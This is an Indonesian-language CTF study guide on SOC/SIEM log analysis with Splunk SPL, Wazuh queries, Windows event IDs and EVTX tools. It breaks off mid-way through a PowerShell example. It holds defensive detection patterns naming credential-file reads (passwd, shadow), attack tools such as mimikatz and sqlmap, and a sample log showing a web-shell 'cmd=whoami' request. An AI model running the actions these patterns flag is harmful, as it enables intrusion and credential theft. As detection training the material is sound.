# 🛡️ CTF SOC & SIEM — Panduan Lengkap: Wazuh, Splunk & Log Forensics

> Panduan untuk pemula yang akan menghadapi soal **SOC/SIEM** di lomba CTF tingkat provinsi.
> Fokus pada **Wazuh**, **Splunk**, dan analisis **EVTX** (Windows Event Logs).

---

## Daftar Isi

- [Bagian 0: Fondasi — Apa itu SOC & SIEM?](#bagian-0-fondasi)
- [Bagian 1: Konsep Log & Event yang WAJIB Dipahami](#bagian-1-konsep-log--event)
- [Bagian 2: Windows Event Logs (EVTX)](#bagian-2-windows-event-logs-evtx)
- [Bagian 3: Splunk — Panduan Lengkap](#bagian-3-splunk)
- [Bagian 4: Wazuh — Panduan Lengkap](#bagian-4-wazuh)
- [Bagian 5: Log Forensics — Teknik Analisis](#bagian-5-log-forensics)
- [Bagian 6: Skenario Serangan Umum & Cara Mendeteksinya](#bagian-6-skenario-serangan)
- [Bagian 7: Walkthrough Soal CTF SOC/SIEM](#bagian-7-walkthrough)
- [Bagian 8: Cheat Sheet & Quick Reference](#bagian-8-cheat-sheet)

---

# Bagian 0: Fondasi

## Apa itu SOC?

**SOC (Security Operations Center)** = tim/pusat yang memantau, mendeteksi, dan merespons ancaman keamanan siber secara real-time.

```
Analogi:
SOC = CCTV control room sebuah gedung
- Layar monitor    = SIEM dashboard
- Rekaman CCTV     = log data
- Petugas keamanan = SOC analyst
- Alarm            = alert/rules
```

## Apa itu SIEM?

**SIEM (Security Information and Event Management)** = software yang mengumpulkan, menyimpan, dan menganalisis log dari BANYAK sumber secara terpusat.

```
Tanpa SIEM:
  Server 1 → log sendiri
  Server 2 → log sendiri
  Firewall → log sendiri
  Router → log sendiri
  → Analyst harus cek SATU PER SATU → lambat!

Dengan SIEM:
  Server 1 ──┐
  Server 2 ──┤
  Firewall ──┼──→ [SIEM] → Dashboard + Alerts + Search
  Router   ──┤                 ↓
  Endpoint ──┘            SOC Analyst analisis terpusat
```

## Apa itu Log?

**Log** = catatan kejadian yang terjadi di sistem. Setiap aktivitas menghasilkan log entry.

```
Contoh log entry:
[2026-01-15 14:30:22] [WARNING] Failed login attempt for user "admin" from IP 192.168.1.100
[2026-01-15 14:30:23] [WARNING] Failed login attempt for user "admin" from IP 192.168.1.100
[2026-01-15 14:30:24] [WARNING] Failed login attempt for user "admin" from IP 192.168.1.100
[2026-01-15 14:30:25] [INFO] Successful login for user "admin" from IP 192.168.1.100
← 3x gagal lalu berhasil = BRUTE FORCE berhasil!
```

## Alur Kerja SOC Analyst di CTF

```
1. TERIMA SOAL → biasanya berupa:
   - Akses ke SIEM (Splunk/Wazuh) yang sudah berisi log
   - File EVTX yang perlu dianalisis
   - Pertanyaan: "Kapan attacker login?", "IP attacker?", "File apa yang diexfiltrate?"

2. INVESTIGASI → gunakan query/filter untuk:
   - Cari aktivitas mencurigakan
   - Identifikasi timeline kejadian
   - Temukan IOC (Indicators of Compromise)

3. JAWAB → biasanya format:
   - Flag langsung: flag{IP_address} atau flag{timestamp}
   - Jawaban spesifik: username attacker, malware filename, dll.
```

---

# Bagian 1: Konsep Log & Event

## Sumber Log yang Penting

| Sumber | Apa yang Dicatat | Contoh |
|--------|-----------------|--------|
| **Windows Event Log** | Login, proses, service, policy | Event ID 4624 (login sukses) |
| **Linux Syslog** | System events, auth, kernel | `/var/log/auth.log`, `/var/log/syslog` |
| **Firewall** | Traffic allow/deny | `DROP TCP 192.168.1.5:12345 → 10.0.0.1:80` |
| **Web Server** | HTTP request/response | Apache access.log, nginx access.log |
| **IDS/IPS** | Intrusion detection alerts | Snort/Suricata alert |
| **DNS Server** | DNS queries | `Query: evil-domain.com` |
| **Proxy** | Web browsing activity | URL, user-agent, bytes transferred |
| **Email Server** | Email send/receive | SMTP logs |
| **Endpoint (EDR)** | Process creation, file access | Sysmon event logs |

## Format Log Umum

### Syslog (Linux)

```
Format: <timestamp> <hostname> <process>[<pid>]: <message>

Contoh:
Jan 15 14:30:22 webserver sshd[12345]: Failed password for admin from 192.168.1.100 port 54321 ssh2
Jan 15 14:30:25 webserver sshd[12345]: Accepted password for admin from 192.168.1.100 port 54321 ssh2
Jan 15 14:31:00 webserver sudo[12346]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
```

### Apache/Nginx Access Log

```
Format: <IP> - <user> [<timestamp>] "<method> <URL> <proto>" <status> <bytes> "<referrer>" "<user-agent>"

Contoh:
192.168.1.100 - - [15/Jan/2026:14:30:22 +0000] "GET /admin/login.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
192.168.1.100 - - [15/Jan/2026:14:30:25 +0000] "POST /admin/login.php HTTP/1.1" 302 0 "-" "Mozilla/5.0"
192.168.1.100 - - [15/Jan/2026:14:31:00 +0000] "GET /admin/upload.php?cmd=whoami HTTP/1.1" 200 45 "-" "curl/7.68"
                                                        ↑ COMMAND INJECTION!
```

### Windows Event Log (XML)

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing" />
    <EventID>4624</EventID>
    <TimeCreated SystemTime="2026-01-15T14:30:22.123Z" />
    <Computer>WORKSTATION1</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">admin</Data>
    <Data Name="IpAddress">192.168.1.100</Data>
    <Data Name="LogonType">10</Data>
    <Data Name="LogonProcessName">User32</Data>
  </EventData>
</Event>
```

---

# Bagian 2: Windows Event Logs (EVTX)

## Apa itu EVTX?

**EVTX** = format file Windows Event Log (dari Windows Vista ke atas). Menyimpan catatan kejadian OS, security, application.

```
Lokasi file EVTX di Windows:
C:\Windows\System32\winevt\Logs\

File penting:
├── Security.evtx         ← LOGIN, LOGOUT, akses resource (PALING PENTING!)
├── System.evtx           ← service start/stop, driver, system events
├── Application.evtx      ← application errors, warnings
├── Microsoft-Windows-Sysmon%4Operational.evtx  ← Sysmon (jika installed)
├── Microsoft-Windows-PowerShell%4Operational.evtx  ← PowerShell activity
├── Microsoft-Windows-TaskScheduler%4Operational.evtx  ← scheduled tasks
└── Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx ← RDP
```

## Event ID yang WAJIB Dihapal!

### Security Events (Security.evtx)

| Event ID | Kategori | Deskripsi | Kenapa Penting |
|----------|---------|-----------|----------------|
| **4624** | Logon | **Successful logon** | Siapa login, kapan, dari mana |
| **4625** | Logon | **Failed logon** | Brute force detection! |
| **4634** | Logon | Logoff | Durasi sesi |
| **4648** | Logon | Logon using explicit credentials | Credential reuse/pass-the-hash |
| **4672** | Logon | Special privileges assigned (admin logon) | Privilege escalation |
| **4688** | Process | **New process created** | Malware execution! |
| **4689** | Process | Process exited | |
| **4697** | Service | Service installed | Persistence! |
| **4698** | Task | Scheduled task created | Persistence! |
| **4699** | Task | Scheduled task deleted | Covering tracks |
| **4702** | Task | Scheduled task updated | |
| **4720** | Account | User account created | Backdoor account! |
| **4722** | Account | User account enabled | |
| **4724** | Account | Password reset attempt | |
| **4728** | Group | Member added to security group | Privilege escalation |
| **4732** | Group | Member added to local group | |
| **4738** | Account | User account changed | |
| **4768** | Kerberos | TGT requested | Kerberoasting |
| **4769** | Kerberos | Service ticket requested | |
| **4771** | Kerberos | Kerberos pre-auth failed | |
| **4776** | Credential | Credential validation | NTLM auth |
| **1102** | Audit | **Audit log cleared** | **COVERING TRACKS!** |
| **4663** | Object | Attempt to access object | File access monitoring |
| **5140** | Share | Network share accessed | Lateral movement |
| **5156** | Firewall | Connection allowed | Network activity |
| **5157** | Firewall | Connection blocked | |

### Logon Types (untuk Event 4624/4625)

| Logon Type | Nama | Deskripsi |
|-----------|------|-----------|
| **2** | Interactive | Login langsung di keyboard (local) |
| **3** | Network | Akses via network (SMB, shared folder) |
| **4** | Batch | Scheduled task |
| **5** | Service | Service startup |
| **7** | Unlock | Screen unlock |
| **8** | NetworkCleartext | Login cleartext via network (FTP, IIS Basic Auth) |
| **9** | NewCredentials | RunAs dengan credential berbeda |
| **10** | RemoteInteractive | **RDP login!** |
| **11** | CachedInteractive | Login dengan cached credentials (offline) |

### Sysmon Events (jika Sysmon terinstall)

| Event ID | Deskripsi | Kenapa Penting |
|----------|-----------|----------------|
| **1** | Process creation (detail!) | Malware execution, command line |
| **3** | Network connection | C2 communication |
| **7** | Image loaded (DLL) | DLL injection |
| **8** | CreateRemoteThread | Process injection! |
| **10** | Process access | Credential dumping (lsass) |
| **11** | File create | Malware drop |
| **12/13/14** | Registry events | Persistence |
| **15** | FileCreateStreamHash | ADS (Alternate Data Streams) |
| **22** | DNS query | C2 domain lookup |

### PowerShell Events

| Event ID | Log | Deskripsi |
|----------|-----|-----------|
| **4103** | PowerShell Operational | Module logging (command detail) |
| **4104** | PowerShell Operational | **Script block logging** (FULL SCRIPT!) |
| **400** | PowerShell | Engine start |
| **800** | PowerShell | Pipeline execution detail |

## Cara Membaca EVTX

### Tool 1: Event Viewer (Windows GUI)

```
1. Start → Event Viewer (eventvwr.msc)
2. Buka file: Action → Open Saved Log → pilih file .evtx
3. Navigasi:
   - Panel kiri: log categories
   - Panel tengah: daftar events
   - Panel bawah: detail event (General & Details tab)
4. Filter:
   - Klik kanan log → Filter Current Log
   - Filter by Event ID, Time, Source, User, Computer
   - Contoh: Event ID = 4624 → hanya logon events
5. Cari:
   - Klik kanan → Find → ketik keyword
```

### Tool 2: EvtxECmd (Eric Zimmerman — CLI)

```powershell
# Download: https://ericzimmerman.github.io/
EvtxECmd.exe -f Security.evtx --csv output/ --csvf security.csv

# Parse semua EVTX di folder:
EvtxECmd.exe -d "C:\Windows\System32\winevt\Logs" --csv output/

# Buka CSV di TimelineExplorer (GUI) atau Excel
```

### Tool 3: python-evtx (Python)

```bash
pip3 install python-evtx
```

```python
import Evtx.Evtx as evtx
import xml.etree.ElementTree as ET

# Buka EVTX file
with evtx.Evtx("Security.evtx") as log:
    for record in log.records():
        xml = record.xml()
        root = ET.fromstring(xml)
        
        # Namespace
        ns = {'ns': 'http://schemas.microsoft.com/win/2004/08/events/event'}
        
        # Ambil Event ID
        event_id = root.find('.//ns:EventID', ns).text
        timestamp = root.find('.//ns:TimeCreated', ns).get('SystemTime')
        
        # Filter hanya event tertentu
        if event_id == '4624':  # successful logon
            data = {}
            for d in root.findall('.//ns:Data', ns):
                data[d.get('Name')] = d.text
            
            print(f"[{timestamp}] Logon: {data.get('TargetUserName')} "
                  f"from {data.get('IpAddress')} "
                  f"(Type {data.get('LogonType')})")
```

### Tool 4: evtx_dump (Rust — cepat!)

```bash
# Install
cargo install evtx
# Atau download binary: https://github.com/omerbenamram/evtx/releases

# Dump ke JSON (paling berguna!)
$ evtx_dump -o json Security.evtx > security.json

# Lalu cari dengan jq:
$ cat security.json | jq 'select(.Event.System.EventID == 4624)'

# Atau grep:
$ evtx_dump Security.evtx | grep -i "4624\|logon\|admin"
```

### Tool 5: Chainsaw (Detection + Hunting)

```bash
# https://github.com/WithSecureLabs/chainsaw
# Auto-detect suspicious events menggunakan Sigma rules!

# Download dari releases → extract

# Hunt untuk semua aktivitas mencurigakan:
$ ./chainsaw hunt Security.evtx -s sigma/ --mapping mappings/sigma-event-logs-all.yml
# Output: semua deteksi yang match Sigma rules!

# Search spesifik:
$ ./chainsaw search "admin" Security.evtx
$ ./chainsaw search --timestamp "2026-01-15T14:00:00" Security.evtx
```

### Tool 6: hayabusa (Timeline + Detection)

```bash
# https://github.com/Yamato-Security/hayabusa
# Mirip Chainsaw, tapi menghasilkan timeline yang rapi

$ ./hayabusa csv-timeline -f Security.evtx -o timeline.csv
$ ./hayabusa logon-summary -f Security.evtx
$ ./hayabusa search -f Security.evtx -k "admin"
```

---

# Bagian 3: Splunk

## Apa itu Splunk?

**Splunk** = platform SIEM komersial yang paling populer. Mengumpulkan, mengindeks, dan menganalisis log data dalam skala besar.

```
Cara kerja Splunk:
1. DATA IN   → log dari berbagai sumber masuk ke Splunk
2. INDEXING  → Splunk mengindeks data agar bisa dicari cepat
3. SEARCHING → Analyst menulis SPL query untuk mencari data
4. ALERTING  → Alert otomatis ketika pattern mencurigakan terdeteksi
5. DASHBOARD → Visualisasi data di dashboard
```

## Splunk Interface

```
┌──────────────────────────────────────────────────────────────┐
│ SPLUNK WEB                                            [≡]   │
├──────────────────────────────────────────────────────────────┤
│ Search Bar:                                                   │
│ ┌──────────────────────────────────────────────────────────┐ │
│ │ index=* sourcetype=WinEventLog EventCode=4624           │ │
│ └──────────────────────────────────────────────────────────┘ │
│ Time Range: [Last 24 hours ▼]  [🔍 Search]                  │
├──────────────────────────────────────────────────────────────┤
│ Events (hasil search):                                        │
│ ┌──────────────────────────────────────────────────────────┐ │
│ │ 01/15/2026 14:30:22 host=DC01 source=Security           │ │
│ │   EventCode=4624 Account_Name=admin Logon_Type=10       │ │
│ │   Source_Network_Address=192.168.1.100                    │ │
│ │                                                           │ │
│ │ 01/15/2026 14:28:01 host=DC01 source=Security           │ │
│ │   EventCode=4625 Account_Name=admin Logon_Type=3        │ │
│ │   Source_Network_Address=192.168.1.100                    │ │
│ └──────────────────────────────────────────────────────────┘ │
│                                                               │
│ Fields sidebar (kiri):  Selected Fields / Interesting Fields  │
│ - EventCode     - Account_Name    - Source_Network_Address    │
│ - Logon_Type    - host            - sourcetype                │
└──────────────────────────────────────────────────────────────┘
```

## SPL (Search Processing Language) — Bahasa Query Splunk

### Dasar-Dasar SPL

```spl
# ═══════════════════════════════════════════════
# SEARCH DASAR — cari event
# ═══════════════════════════════════════════════

# Cari SEMUA events
index=*

# Cari dari index tertentu
index=main
index=security
index=windows

# Cari keyword
index=* "failed login"
index=* "flag{"
index=* error OR warning

# ═══════════════════════════════════════════════
# FILTER — persempit hasil
# ═══════════════════════════════════════════════

# Filter by field value
index=* EventCode=4624
index=* EventCode=4625
index=* sourcetype=WinEventLog:Security
index=* host=DC01
index=* Account_Name=admin
index=* Source_Network_Address=192.168.1.100

# Multiple filters (AND otomatis)
index=* EventCode=4624 Account_Name=admin Logon_Type=10
# Artinya: login sukses AND user=admin AND via RDP

# OR
index=* EventCode=4624 OR EventCode=4625
# Artinya: login sukses ATAU login gagal

# NOT
index=* EventCode=4625 NOT Account_Name=SYSTEM
# Artinya: login gagal tapi bukan dari SYSTEM

# Wildcard
index=* Account_Name=admin*
index=* Source_Network_Address=192.168.1.*

# ═══════════════════════════════════════════════
# TIME RANGE
# ═══════════════════════════════════════════════

# Bisa diset di UI (dropdown time picker) atau di query:
index=* earliest="01/15/2026:14:00:00" latest="01/15/2026:15:00:00"
index=* earliest=-1h          # 1 jam terakhir
index=* earliest=-24h         # 24 jam terakhir  
index=* earliest=-7d          # 7 hari terakhir
```

### SPL Commands — Yang Paling Sering Dipakai

```spl
# ═══════════════════════════════════════════════
# STATS — hitungan dan statistik
# ═══════════════════════════════════════════════

# Hitung total event per user
index=* EventCode=4624 
| stats count BY Account_Name

# Output:
# Account_Name    count
# admin           15
# user1           203
# attacker        1      ← hanya 1x login, mencurigakan?

# Hitung login gagal per IP
index=* EventCode=4625 
| stats count BY Source_Network_Address 
| sort -count

# Output:
# Source_Network_Address   count
# 192.168.1.100           347    ← BANYAK! Brute force!
# 192.168.1.5             2
# 10.0.0.1                1

# Hitung per waktu
index=* EventCode=4625 
| stats count BY Source_Network_Address, Account_Name

# ═══════════════════════════════════════════════
# TABLE — tampilkan field tertentu saja
# ═══════════════════════════════════════════════

index=* EventCode=4624 
| table _time, Account_Name, Source_Network_Address, Logon_Type

# Output tabel rapi:
# _time                  Account_Name  Source_Network_Address  Logon_Type
# 2026-01-15 14:30:22    admin         192.168.1.100           10
# 2026-01-15 14:25:00    user1         192.168.1.5             3

# ═══════════════════════════════════════════════
# SORT — urutkan
# ═══════════════════════════════════════════════

index=* EventCode=4624 
| table _time, Account_Name, Source_Network_Address 
| sort _time                    # ascending (terlama dulu)

index=* EventCode=4624 
| table _time, Account_Name 
| sort -_time                   # descending (terbaru dulu)

# ═══════════════════════════════════════════════
# WHERE — filter setelah stats
# ═══════════════════════════════════════════════

# IP yang login gagal lebih dari 10 kali
index=* EventCode=4625 
| stats count BY Source_Network_Address 
| where count > 10

# ═══════════════════════════════════════════════
# TOP — N teratas
# ═══════════════════════════════════════════════

# 10 user dengan login terbanyak
index=* EventCode=4624 
| top limit=10 Account_Name

# 10 IP paling sering gagal login
index=* EventCode=4625 
| top limit=10 Source_Network_Address

# ═══════════════════════════════════════════════
# RARE — yang paling jarang (anomali!)
# ═══════════════════════════════════════════════

# Proses yang jarang dijalankan (mungkin malware)
index=* EventCode=4688 
| rare limit=10 New_Process_Name

# ═══════════════════════════════════════════════
# TIMECHART — grafik per waktu
# ═══════════════════════════════════════════════

# Jumlah login gagal per jam
index=* EventCode=4625 
| timechart span=1h count BY Source_Network_Address

# ═══════════════════════════════════════════════
# DEDUP — hapus duplikat
# ═══════════════════════════════════════════════

# Unique IPs yang login
index=* EventCode=4624 
| dedup Source_Network_Address 
| table Source_Network_Address, Account_Name

# ═══════════════════════════════════════════════
# REX / REGEX — extract data dengan regex
# ═══════════════════════════════════════════════

# Extract IP dari raw log
index=* 
| rex field=_raw "(?<ip_address>\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"
| table ip_address

# Extract URL path
index=* sourcetype=access_combined 
| rex field=_raw "\"(?:GET|POST) (?<url_path>[^\s]+)"
| table url_path

# ═══════════════════════════════════════════════
# EVAL — buat field baru / transform
# ═══════════════════════════════════════════════

# Buat field baru berdasarkan logon type
index=* EventCode=4624 
| eval logon_method=case(
    Logon_Type=="2", "Interactive",
    Logon_Type=="3", "Network",
    Logon_Type=="10", "RDP",
    1==1, "Other")
| table _time, Account_Name, logon_method

# ═══════════════════════════════════════════════
# LOOKUP / JOIN (advanced)
# ═══════════════════════════════════════════════

# Correlate: login gagal diikuti login berhasil dari IP yang sama
index=* (EventCode=4624 OR EventCode=4625) Source_Network_Address=192.168.1.100
| sort _time
| table _time, EventCode, Account_Name, Source_Network_Address, Logon_Type

# ═══════════════════════════════════════════════
# TRANSACTION — group related events
# ═══════════════════════════════════════════════

# Group login failed + success per user session
index=* (EventCode=4624 OR EventCode=4625)
| transaction Account_Name maxspan=5m
| where eventcount > 3
| table Account_Name, duration, eventcount
```

### SPL Query Siap Pakai untuk CTF

```spl
# ═══ 1. BRUTE FORCE DETECTION ═══
index=* EventCode=4625 
| stats count BY Source_Network_Address, Account_Name 
| where count > 5 
| sort -count
# → IP dan user dengan banyak login gagal

# ═══ 2. SUCCESSFUL BRUTE FORCE (gagal lalu berhasil) ═══
index=* (EventCode=4624 OR EventCode=4625) 
| sort _time 
| transaction Source_Network_Address maxspan=10m 
| search EventCode=4625 EventCode=4624 
| table _time, Source_Network_Address, Account_Name

# ═══ 3. RDP LOGIN ═══
index=* EventCode=4624 Logon_Type=10 
| table _time, Account_Name, Source_Network_Address, ComputerName

# ═══ 4. NEW USER CREATED ═══
index=* EventCode=4720 
| table _time, TargetUserName, SubjectUserName
# Siapa membuat user baru?

# ═══ 5. PROCESS EXECUTION (SUSPICIOUS) ═══
index=* EventCode=4688 
| search New_Process_Name="*powershell*" OR New_Process_Name="*cmd*" OR New_Process_Name="*whoami*" OR New_Process_Name="*net.exe*"
| table _time, Account_Name, New_Process_Name, Process_Command_Line

# ═══ 6. SERVICE INSTALLED (PERSISTENCE) ═══
index=* EventCode=4697 OR EventCode=7045 
| table _time, ServiceName, ServiceFileName, AccountName

# ═══ 7. LOG CLEARED (ANTI-FORENSICS) ═══
index=* EventCode=1102 
| table _time, SubjectUserName, SubjectDomainName
# → siapa menghapus log? kapan?

# ═══ 8. SCHEDULED TASK CREATED ═══
index=* EventCode=4698 
| table _time, TaskName, SubjectUserName

# ═══ 9. LATERAL MOVEMENT (NETWORK SHARE) ═══
index=* EventCode=5140 
| table _time, Account_Name, Share_Name, Source_Address, Access_Mask

# ═══ 10. POWERSHELL SCRIPT EXECUTION ═══
index=* EventCode=4104 
| table _time, ScriptBlockText 
| search ScriptBlockText="*flag*" OR ScriptBlockText="*download*" OR ScriptBlockText="*invoke*"

# ═══ 11. CARI FLAG LANGSUNG ═══
index=* "flag{" 
| table _time, _raw

# ═══ 12. USER AGENT ANALYSIS (Web Logs) ═══
index=* sourcetype=access_* 
| top limit=20 useragent
# → Cari user-agent yang aneh (curl, python-requests, nikto, sqlmap)

# ═══ 13. HTTP STATUS ANOMALY ═══
index=* sourcetype=access_* status>=400 
| stats count BY status, uri_path 
| sort -count
# → 404/403/500 banyak = scanning/attack

# ═══ 14. DNS EXFILTRATION ═══
index=* sourcetype=dns 
| eval query_length=len(query) 
| where query_length > 50 
| table _time, src_ip, query
# → DNS query sangat panjang = possible exfiltration

# ═══ 15. TIMELINE CREATION ═══
index=* (EventCode=4624 OR EventCode=4625 OR EventCode=4688 OR EventCode=4720)
| eval activity=case(
    EventCode=="4624","LOGIN",
    EventCode=="4625","FAILED_LOGIN",
    EventCode=="4688","PROCESS_CREATED",
    EventCode=="4720","USER_CREATED")
| table _time, activity, Account_Name, Source_Network_Address, New_Process_Name
| sort _time
```

---

# Bagian 4: Wazuh

## Apa itu Wazuh?

**Wazuh** = platform SIEM/XDR **open-source**. Kombinasi dari host-based intrusion detection (HIDS), log management, dan security analytics.

```
Komponen Wazuh:
├── Wazuh Agent     → diinstall di endpoint (Windows/Linux), kirim log ke server
├── Wazuh Manager   → terima & analisis log, generate alerts
├── Wazuh Indexer   → simpan data (based on OpenSearch/Elasticsearch)
└── Wazuh Dashboard → web UI untuk visualisasi & query (based on OpenSearch Dashboards)
```

## Wazuh Dashboard Interface

```
┌─────────────────────────────────────────────────────────────┐
│ WAZUH DASHBOARD                                      [≡]    │
├─────────┬───────────────────────────────────────────────────┤
│ Menu:   │                                                    │
│         │  ┌─ Overview Dashboard ─────────────────────────┐ │
│ Modules │  │  Total Alerts: 1,234                          │ │
│ ├─Security│  │  Critical: 5  High: 23  Medium: 156  Low: 1050│ │
│ ├─Integrity│ │                                              │ │
│ ├─Vulnerab│  │  [Timeline Chart]                            │ │
│ ├─Threat  │  │  [Top Agents] [Top Rules] [Top MITRE ATT&CK]│ │
│ └─Events  │  └──────────────────────────────────────────────┘ │
│           │                                                    │
│ Management│  Events Tab:                                       │
│           │  ┌─────────────────────────────────────────────┐  │
│           │  │ Time     | Agent | Rule  | Description       │  │
│           │  │ 14:30:22 | WS01  | 5710  | sshd auth fail   │  │
│           │  │ 14:30:25 | WS01  | 5715  | sshd auth success │  │
│           │  └─────────────────────────────────────────────┘  │
└─────────┴───────────────────────────────────────────────────┘
```

## Navigasi Wazuh Dashboard

### Area Utama:

```
1. MODULES (Menu Kiri):
   ├── Security Events     → semua security alerts
   ├── Integrity Monitoring → file integrity changes (FIM)
   ├── Vulnerabilities      → vulnerability detection
   ├── MITRE ATT&CK        → map alerts ke MITRE framework
   ├── Regulatory Compliance → PCI DSS, GDPR, dll.
   └── Threat Intelligence  → common threat detection

2. EVENTS:
   → Tab "Events" di setiap module menunjukkan raw events
   → Bisa filter, search, dan drill-down

3. AGENTS:
   → Management → Agents → list semua endpoint yang termonitor
   → Klik agent → lihat alerts khusus agent tersebut

4. DISCOVER (OpenSearch):
   → Menu hamburger → Discover
   → Mirip Splunk search — query langsung ke data
```

### Pencarian di Wazuh

Wazuh Dashboard menggunakan **KQL (Kibana Query Language)** atau **Lucene Query Syntax**:

```
═══ BASIC SEARCH ═══
rule.id: 5710                              # filter by Wazuh rule ID
agent.name: "workstation1"                 # filter by agent name
data.win.system.eventID: "4624"            # Windows Event ID
rule.level: >= 12                          # high severity alerts
data.srcip: "192.168.1.100"               # source IP

═══ KEYWORD SEARCH ═══
"failed password"                          # search di semua field
"flag{"                                    # cari flag
"powershell" AND "encoded"                 # AND search

═══ WILDCARD ═══
agent.name: work*                          # workstation1, workstation2, dll.
data.win.eventdata.user: admin*

═══ COMBINE ═══
data.win.system.eventID: "4625" AND data.srcip: "192.168.1.100"
rule.level: >= 10 AND agent.name: "DC01"

═══ NOT ═══
data.win.system.eventID: "4624" AND NOT data.win.eventdata.logonType: "5"
# Login sukses tapi BUKAN service logon
```

## Wazuh Rules yang Penting

Wazuh punya rule system sendiri. Setiap alert punya **Rule ID** dan **Level** (0-15):

```
Level 0-3:   Informational
Level 4-7:   Low severity
Level 8-11:  Medium severity  
Level 12-14: High severity
Level 15:    Critical (emergency)
```

### Rule ID Penting:

```
═══ AUTHENTICATION ═══
5501  - Login session opened
5502  - Login session closed
5503  - User login failed
5710  - sshd authentication failure
5712  - sshd reverse lookup error
5715  - sshd authentication success
5716  - sshd invalid user attempt
5720  - Multiple authentication failures       ← BRUTE FORCE!
5763  - PAM: Login session opened for user

═══ WINDOWS EVENT LOG ═══
60009 - Windows Logon Success (4624)
60010 - Windows Logon Failure (4625)
60011 - Windows Special Logon (4672)
60012 - Windows Logoff (4634)
60106 - Windows Account Created (4720)
60108 - Windows Security Group Changed (4728)
60109 - Computer Account Created
60122 - Audit Log Cleared (1102)               ← ANTI-FORENSICS!

═══ FILE INTEGRITY ═══
550   - Integrity checksum changed
553   - File added to system
554   - File deleted from system

═══ ANOMALY DETECTION ═══
5104  - Process hidden from /proc
5302  - Process running from suspicious dir
5303  - Anomaly detected (network output)
5704  - Brute force attack (multiple hosts)

═══ WEB ATTACK ═══
31101 - Web server 400 error
31104 - Common web attack                      ← SQLi, XSS, etc.
31105 - XSS (Cross-Site Scripting)
31106 - SQL injection attempt
31151 - Multiple web server errors (scan)

═══ ROOTKIT ═══
510   - Host-based anomaly detection
```

## Query Wazuh Siap Pakai untuk CTF

```
# ═══ 1. SEMUA LOGIN GAGAL ═══
data.win.system.eventID: "4625"

# ═══ 2. LOGIN GAGAL DARI IP TERTENTU ═══
data.win.system.eventID: "4625" AND data.win.eventdata.ipAddress: "192.168.1.100"

# ═══ 3. LOGIN SUKSES VIA RDP ═══
data.win.system.eventID: "4624" AND data.win.eventdata.logonType: "10"

# ═══ 4. USER BARU DIBUAT ═══
data.win.system.eventID: "4720"

# ═══ 5. HIGH SEVERITY ALERTS ═══
rule.level: >= 12

# ═══ 6. BRUTE FORCE DETECTED ═══
rule.id: "5720" OR rule.description: *brute*

# ═══ 7. PROCESS EXECUTION SUSPICIOUS ═══
data.win.system.eventID: "4688" AND (
    data.win.eventdata.newProcessName: *powershell* OR
    data.win.eventdata.newProcessName: *cmd.exe* OR
    data.win.eventdata.newProcessName: *whoami* OR
    data.win.eventdata.newProcessName: *mimikatz*
)

# ═══ 8. LOG CLEARED ═══
data.win.system.eventID: "1102" OR rule.id: "60122"

# ═══ 9. FILE INTEGRITY CHANGES ═══
rule.groups: "syscheck" AND syscheck.event: "modified"

# ═══ 10. CARI FLAG ═══
"flag{" OR "CTF{"

# ═══ 11. OVERVIEW SEMUA AGENT ═══
# Dashboard → Agents → lihat status setiap endpoint

# ═══ 12. MITRE ATT&CK MAPPING ═══
# Dashboard → MITRE ATT&CK → lihat teknik yang terdeteksi
# Sangat berguna untuk memahami attack chain!
```

---

# Bagian 5: Log Forensics — Teknik Analisis

## Pendekatan Umum

```
1. TENTUKAN SCOPE
   → Apa yang dicari? (attacker IP, timestamp, malware, exfiltrasi)
   → Time range berapa?
   
2. IDENTIFIKASI SUMBER LOG
   → Windows Event Log? Web server log? Firewall log?
   
3. CARI ANOMALI
   → Spike traffic pada waktu tidak biasa
   → Login dari IP/lokasi yang tidak biasa
   → Proses/user yang tidak dikenal
   → Command mencurigakan
   
4. KORELASI
   → Hubungkan event antar sumber log
   → Bangun timeline kejadian
   
5. JAWAB
   → Siapa (attacker)? → IP, username
   → Kapan? → timestamp
   → Apa? → aksi yang dilakukan
   → Bagaimana? → teknik/tool yang digunakan
```

## Analisis Log Linux dengan CLI

```bash
# ═══ AUTH LOG — login attempts ═══
$ cat /var/log/auth.log | grep "Failed password"
# Jan 15 14:30:22 server sshd[123]: Failed password for admin from 192.168.1.100

# Hitung login gagal per IP:
$ grep "Failed password" /var/log/auth.log | grep -oP '\d+\.\d+\.\d+\.\d+' | sort | uniq -c | sort -rn
#  347 192.168.1.100     ← Brute force!
#    2 192.168.1.5
#    1 10.0.0.1

# Login berhasil setelah brute force:
$ grep -E "Accepted|Failed" /var/log/auth.log | grep "192.168.1.100"

# ═══ WEB SERVER LOG — Apache/Nginx ═══
# Top IPs:
$ awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -10

# Top URLs:
$ awk '{print $7}' access.log | sort | uniq -c | sort -rn | head -20

# Top status codes:
$ awk '{print $9}' access.log | sort | uniq -c | sort -rn

# Cari SQL injection:
$ grep -iE "union|select|insert|drop|delete|update|exec|script|<|>" access.log

# Cari command injection:
$ grep -iE "cmd=|exec=|system\(|whoami|passwd|shadow|etc" access.log

# Cari directory traversal:
$ grep -E "\.\./|\.\.\\\\|%2e%2e" access.log

# Cari scanner/bot:
$ grep -iE "nikto|sqlmap|nmap|dirbuster|gobuster|wfuzz" access.log

# ═══ SYSLOG ═══
$ grep -iE "error|warning|critical|emergency|alert" /var/log/syslog

# ═══ TIMELINE — urut berdasarkan waktu ═══
$ sort -k1,2 /var/log/auth.log | less
```

## Analisis EVTX dengan PowerShell

```powershell
# ═══ BACA EVENT LOG ═══
Get-WinEvent -Path "Security.evtx" | Select-Object TimeCreated, Id, Message | Out-GridView

# ═══ FILTER BY EVENT ID ═══
Get-WinEvent -Path "Security.evtx" -FilterHashtable @{Id=4624} |
    Select-Object TimeCreated, @{n='User';e={$_.Properties[5].Value}}, 
    @{n='IP';e={$_.Properties[18].Value}}, 
    @{n='LogonType';e={$_.Properties[8].Value}} |
    Format-Table -AutoSize

# ═══ LOGIN GAGAL ═══
Get-WinEvent -Path "Security.evtx" -FilterHashtable @{Id=4625} |
